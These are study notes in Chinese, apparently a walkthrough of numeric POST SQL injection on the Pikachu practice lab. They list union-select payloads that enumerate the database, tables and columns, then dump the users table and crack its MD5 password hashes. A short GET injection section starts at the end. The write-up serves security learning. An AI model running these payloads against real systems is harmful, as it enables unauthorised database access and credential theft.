	相关文章一直达
[[020-SQL盲注和布尔盲注流程]]
[[018-认识SQL注入]]
[[021-SQL自动化注入工具安装]]

# 数字型POST注入

*页面概览*
![[Pasted image 20260621200327.png]]

## 构建payload
	这个是POST请求的注入题目，需要用bp抓包，在表单里面提交才行。这里说了是数字型的，就不用去拿引号去测试字符和数字型了。
	抓包，在bp里面进行注入测试
### 1、初次测试是否有漏洞（爆洞）
```sql
id=1 and 1=1--+          # 图1显示正常
```
图示
	显示正常
![[Pasted image 20260621200908.png]]

```sql
id=1 and 1=2--+          # 图2显示错误，没有找到数据，不正常，有洞！！！
```
![[Pasted image 20260621201205.png]]
### 2、爆回显位
```sql
id=1 order by 1--+     # 可以先从3开始，5，7这种查询
id=1 order by 3--+
id=1 order by 5--+
```

图示

	经过测试，回显位为2
	1显示正常，2也正常，3报错了，这里得出回显位是2，可以做后续的测试了

![[Pasted image 20260621202442.png]]
### 3、爆数据库
```sql
id=-1 union select database(),version()--+
```
图示

	这里的-1是去查询一个不存在的数据。可以用来排掉一些正常但是渗透测试不需要的数据
获得的信息
	==MySQL版本：MySQL5.7==
	==MySQLname：pikachu==
![[Pasted image 20260621202749.png]]

### 4、爆表
```sql
id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu'--+
```
图示

	group_concat()是一个聚合函数，会把查到的数据整合到一起，做sql注入的时候加入这个会更好的显示出来。
	information_schema.tables是调用的MySQL的一个系统库，存放的是所有数据库的信息。

![[Pasted image 20260621203344.png]]

已获得信息：
	pikachu数据库的表：
		httpinfo,
		member,
		message,
		==users,==
		xssblind
### 5、爆列名


```sql
id=-1 union select 1,group_concat(column_name) from information_schema.columns 
where table_name='users'--+
```
图示
![[Pasted image 20260621205846.png]]

获得的信息：
	id,
	==username,==
	==password==,
	level

### 6、爆数据
	concat_ws()函数是用来分割字符串信息的，全称如下：
	concat_ws(0x7c)
	0x7c是ASCII编码中的|，是管道符，用来分开粘连的数据信息的！！！

```sql
id=-1 union select 1,group_concat(concat_ws(0x7c,username,password,level)) 
from users--+
```

![[Pasted image 20260621205619.png]]

获得的新信息：
admin|e10adc3949ba59abbe56e057f20f883e|1,pikachu|670b14728ad9902aecba32e22fa4f6bd|2,test|e99a18c428cb38d5f260853678922e03|3

	这是经过加密之后的数据，高度疑似MD5加密
	MD5是由十六进制的字符成的，0~9~a~f
	放到解密网站之后，解开的信息如下：

**得胜

| 用户名     | MD5值                             | 解密之后的值   |
| ------- | -------------------------------- | -------- |
| admin   | e10adc3949ba59abbe56e057f20f883e | *123456* |
| pikachu | 670b14728ad9902aecba32e22fa4f6bd | *000000* |
| test    | e99a18c428cb38d5f260853678922e03 | *abc123* |
# 字符型GET注入
## 构建payload
### 1、初步测试是否有漏洞（爆洞）

	注解：这个get型和post型是有不同的，get是短且能直接在url上显示的，而post则是表单提交的，需要在里面写入信息才可以。

![[Pasted image 20260621211131.png]]